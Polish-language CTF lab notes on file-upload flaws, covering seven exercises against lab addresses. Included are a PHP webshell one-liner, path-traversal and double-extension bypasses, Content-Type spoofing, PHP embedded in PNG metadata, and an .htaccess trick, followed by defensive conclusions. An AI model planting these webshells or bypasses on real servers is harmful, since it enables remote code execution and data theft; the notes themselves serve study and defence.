# 📁 Upload Plików – Notatki z Zajęć nr 14

> **Poziom:** Entry Level  
> **Platforma:** HackingDept / PJATK  
> **Temat:** Błędy w implementacji mechanizmu uploadu plików  
> **Forma:** Notatki praktyczne (CTF write-up)

---

## 📋 Spis treści

- [Teoria – co to są błędy uploadu?](#teoria)
- [Zadanie 14.1 – RCE (Remote Code Execution)](#zadanie-141--rce)
- [Zadanie 14.2 – Path Traversal](#zadanie-142--path-traversal)
- [Zadanie 14.3 – Biała lista](#zadanie-143--biała-lista)
- [Zadanie 14.4 – Nagłówek HTTP (Content-Type)](#zadanie-144--nagłówek-http)
- [Zadanie 14.5 – Nagłówek pliku (Magic Bytes)](#zadanie-145--nagłówek-pliku)
- [Zadanie 14.1p – .htaccess](#zadanie-141p--htaccess)
- [Zadanie 14.2p – Czarna lista](#zadanie-142p--czarna-lista)
- [Podsumowanie](#podsumowanie)

---

## Teoria

Błędy przy implementacji mechanizmu uploadu plików w aplikacjach webowych mogą prowadzić do poważnych luk bezpieczeństwa. Najczęstsze problemy to:

| Problem | Skutek |
|--------|--------|
| Brak weryfikacji typu pliku | Upload złośliwych skryptów (np. PHP) |
| Niewłaściwe zarządzanie nazwami plików | Path traversal, nadpisywanie plików |
| Brak weryfikacji zawartości pliku | Upload pliku z fałszywym rozszerzeniem |
| Brak limitu rozmiaru | Ataki DoS |
| Złe uprawnienia do katalogów | Nieautoryzowany dostęp do danych |

---

## Zadanie 14.1 – RCE

**URL:** `http://192.168.100.14/site1/`  
**Cel:** Wykonanie dowolnych poleceń systemowych na serwerze (Remote Code Execution)  
**Zabezpieczenie:** Brak – serwer przyjmuje każdy plik

### Krok 1 – Tworzenie pliku webshell

```bash
# Tworzę plik shell.php z prostym webshell'em
echo '<?php system($_GET["x"]); ?>' > shell.php
```

**Do czego służy ten kod?**  
`system($_GET["x"])` – pobiera parametr `x` z adresu URL i wykonuje go jako polecenie systemowe na serwerze. To tzw. **webshell**.

### Krok 2 – Upload pliku

Wchodzę na stronę i uploaduję plik `shell.php` przez formularz.

### Krok 3 – Wykonanie poleceń

```
# Sprawdzam kim jestem na serwerze
http://192.168.100.14/site1/shell.php?x=id

# Odczytuję flagę
http://192.168.100.14/site1/shell.php?x=cat /flag14.1.txt
```

**Co robi `id`?** – Wyświetla aktualnego użytkownika systemu (uid, gid, grupy).  
**Co robi `cat`?** – Wypisuje zawartość pliku na ekran.

### 🏁 Flaga
```
PJATK{upload1_1d1b612}
```

---

## Zadanie 14.2 – Path Traversal

**URL:** `http://192.168.100.14/site2/`  
**Cel:** Upload pliku PHP do katalogu dostępnego przez przeglądarkę  
**Zabezpieczenie:** Serwer zapisuje plik w nieznanym, niedostępnym katalogu

### Na czym polega Path Traversal?

Aplikacja używa nazwy pliku do budowania ścieżki zapisu. Jeśli nie filtruje sekwencji `../`, możemy "wyjść" z docelowego katalogu i zapisać plik gdzie chcemy.

### Krok 1 – Przechwycenie żądania w Burp Suite

Uploaduję normalnie `shell.php`, a w Burp Suite przechwytuję żądanie POST i zmieniam pole `filename`:

```
# Oryginalne pole w nagłówku:
Content-Disposition: form-data; name="f"; filename="shell.php"

# Zmieniam na (wychodzę do katalogu site2/):
Content-Disposition: form-data; name="f"; filename="../shell.php"
```

**Co robi `../`?** – Cofam się o jeden katalog w górę w drzewie folderów.

### Krok 2 – Odczyt flagi

```
# Wykonuję polecenie przez webshell
http://192.168.100.14/site2/shell.php?x=cat /flag14.2.txt
```

### 🏁 Flaga
```
PJATK{upload2_eb0f2d6}
```

---

## Zadanie 14.3 – Biała lista

**URL:** `http://192.168.100.14/site3/`  
**Cel:** Upload pliku PHP mimo filtrowania rozszerzeń  
**Zabezpieczenie:** Serwer sprawdza, czy nazwa pliku **zawiera** ciąg `.png`

### Na czym polega błąd?

Serwer sprawdza tylko, czy `.png` **gdziekolwiek** występuje w nazwie pliku – nie sprawdza, czy to faktycznie ostatnie rozszerzenie.

### Krok 1 – Zmiana nazwy pliku

```bash
# Kopiuję shell.php i nadaję mu nazwę z .png w środku
mv shell.php shell.png.php
```

**Dlaczego to działa?** – Serwer widzi `.png` w nazwie → przepuszcza plik. Apache widzi ostatnie rozszerzenie `.php` → wykonuje plik jako skrypt PHP.

### Krok 2 – Odczyt flagi

```
http://192.168.100.14/site3/shell.png.php?x=cat /flag14.3.txt
```

### 🏁 Flaga
```
PJATK{upload3_033619a}
```

---

## Zadanie 14.4 – Nagłówek HTTP

**URL:** `http://192.168.100.14/site4/`  
**Cel:** Upload pliku PHP mimo weryfikacji Content-Type  
**Zabezpieczenie:** Serwer sprawdza nagłówek `Content-Type` w żądaniu HTTP

### Na czym polega błąd?

Serwer ufa nagłówkowi `Content-Type` wysyłanemu przez klienta. Ten nagłówek można jednak ręcznie zmienić w Burp Suite.

### Krok 1 – Przechwycenie żądania w Burp Suite

Uploaduję `shell.php`, przechwytuję żądanie i zmieniam nagłówek pliku:

```http
# Zmieniam tę linię:
Content-Type: application/x-php

# Na:
Content-Type: image/png
```

**Co to jest `Content-Type`?** – Nagłówek HTTP informujący serwer o typie przesyłanych danych. `image/png` sugeruje, że to obrazek.

### Krok 2 – Odczyt flagi

```
http://192.168.100.14/site4/shell.php?x=cat /flag14.4.txt
```

### 🏁 Flaga
```
PJATK{upload4_0b7ebfb}
```

---

## Zadanie 14.5 – Nagłówek pliku

**URL:** `http://192.168.100.14/site5/`  
**Cel:** Upload pliku PHP, który przejdzie weryfikację magic bytes  
**Zabezpieczenie:** Serwer analizuje **rzeczywistą zawartość** pliku (magic bytes), nie tylko rozszerzenie czy nagłówek HTTP

### Na czym polegają Magic Bytes?

Każdy typ pliku ma charakterystyczne bajty na początku (np. PNG zaczyna się od `\x89PNG`). Serwer czyta te bajty, żeby sprawdzić, czy to faktycznie obrazek.

### Rozwiązanie – Osadzenie PHP w metadanych obrazka

```bash
# 1. Lokalizuję przykładowy obrazek PNG na systemie
locate png

# 2. Kopiuję przykładowy plik PNG
cp /var/lib/inetsim/http/fakefiles/sample.png .

# 3. Wstrzykuję kod PHP do metadanych obrazka (pole Comment)
exiftool -comment='<?php system($_GET["x"]); ?>' sample.png

# 4. Zmieniam rozszerzenie na .php
cp sample.png sample.php
```

**Co robi `exiftool`?** – Narzędzie do edycji metadanych plików (EXIF). Pole `comment` jest przechowywane w pliku, ale nie wpływa na magic bytes – plik nadal zaczyna się od `\x89PNG`.

**Co robi `locate`?** – Wyszukuje pliki po nazwie w bazie danych systemu plików.

### Krok 2 – Upload i odczyt flagi

Uploaduję `sample.php` przez formularz.

```
http://192.168.100.14/site5/sample.php?x=cat /flag14.5.txt
```

### 🏁 Flaga
```
PJATK{upload5_5abbe3c}
```

---

## Zadanie 14.1p – .htaccess

**URL:** `http://192.168.100.64/`  
**Cel:** Zmiana konfiguracji serwera Apache przez upload pliku `.htaccess`  
**Zabezpieczenie:** Serwer blokuje upload plików zawierających `php` w nazwie

### Na czym polega atak?

Plik `.htaccess` to plik konfiguracyjny Apache, który można umieszczać w katalogach. Pozwala lokalnie nadpisać ustawienia serwera – m.in. zdefiniować, jakie rozszerzenia mają być traktowane jako PHP.

### Krok 1 – Tworzenie pliku .htaccess

```bash
# Tworzę plik .htaccess
echo 'AddType application/x-httpd-php .txt' > .htaccess
```

**Co robi ta linia?** – Mówi serwerowi Apache: "traktuj wszystkie pliki `.txt` w tym katalogu jako skrypty PHP".

### Krok 2 – Upload .htaccess

Uploaduję plik `.htaccess` przez formularz. Nazwa nie zawiera `php` → przechodzi przez filtr.

### 🏁 Wynik

Zadanie zalicza się automatycznie po poprawnym uploadzie `.htaccess`.

---

## Zadanie 14.2p – Czarna lista

**URL:** `http://192.168.100.64/`  
**Cel:** Odczyt flagi z serwera  
**Zabezpieczenie:** Blokada plików z `php` w nazwie  
**Warunek wstępny:** Ukończone zadanie 14.1p (`.htaccess` już uploadowany)

### Krok 1 – Tworzenie webshell jako .txt

```bash
# Plik .txt zostanie teraz wykonany jako PHP dzięki .htaccess
echo '<?php system($_GET["x"]); ?>' > shell.txt
```

### Krok 2 – Upload i wykonanie

Uploaduję `shell.txt` (nazwa nie zawiera `php` → przechodzi przez filtr).

```
# Listowanie katalogu głównego
http://192.168.100.64/shell.txt?x=ls /

# Odczyt flagi
http://192.168.100.64/shell.txt?x=cat /flag[nazwa_pliku].txt
```

**Co robi `ls`?** – Listuje pliki i katalogi. `ls /` pokazuje zawartość katalogu głównego systemu.

### 🏁 Flaga
```
PJATK{donottrustanything_0b9e842}
```

---

## Podsumowanie

Ukończyłam wszystkie 7 zadań z zakresu bezpieczeństwa mechanizmu uploadu plików. Poniżej zestawienie poznanych technik:

| Zadanie | Typ ataku | Na czym polegał błąd |
|---------|-----------|----------------------|
| 14.1 | RCE | Brak jakiejkolwiek walidacji – można uploadować dowolny plik |
| 14.2 | Path Traversal | Niekontrolowane użycie nazwy pliku w ścieżce zapisu |
| 14.3 | Biała lista (bypass) | Sprawdzanie czy `.png` **zawiera się** w nazwie, nie czy jest ostatnim rozszerzeniem |
| 14.4 | Content-Type Bypass | Ślepe zaufanie do nagłówka HTTP `Content-Type` kontrolowanego przez klienta |
| 14.5 | Magic Bytes Bypass | PHP w metadanych obrazka – magic bytes OK, ale kod PHP się wykona |
| 14.1p | .htaccess Upload | Możliwość zmiany konfiguracji Apache przez upload pliku konfiguracyjnego |
| 14.2p | Czarna lista (bypass) | Blokada tylko plików z "php" w nazwie – ominięta przez .htaccess + .txt |

### Kluczowe narzędzia użyte w ćwiczeniach

| Narzędzie | Do czego służy |
|-----------|----------------|
| `Burp Suite` | Przechwytywanie i modyfikowanie żądań HTTP |
| `exiftool` | Edycja metadanych plików (EXIF) |
| `echo` | Tworzenie plików z zawartością |
| `mv` / `cp` | Zmiana nazwy / kopiowanie pliku |
| `locate` | Wyszukiwanie plików na dysku |
| `cat` | Wyświetlanie zawartości pliku |
| `ls` | Listowanie plików i katalogów |
| `id` | Sprawdzenie tożsamości użytkownika na serwerze |

### Wnioski

Ćwiczenie pokazało, że **poprawna implementacja uploadu plików jest trudna** i wymaga wielowarstwowej ochrony:
- Walidacji rozszerzenia (sprawdzanie ostatniego rozszerzenia, nie tylko czy coś się "zawiera")
- Weryfikacji MIME type po stronie serwera (nie z nagłówka HTTP)
- Analizy magic bytes
- Zmiany nazwy pliku przy zapisie (np. na losowy UUID)
- Blokady uploadu plików konfiguracyjnych (`.htaccess`)
- Przechowywania plików poza katalogiem dostępnym przez web

---

> **Referencje:**  
> - [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)  
> - [SANS – Secure File Upload](https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/)  
> - [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
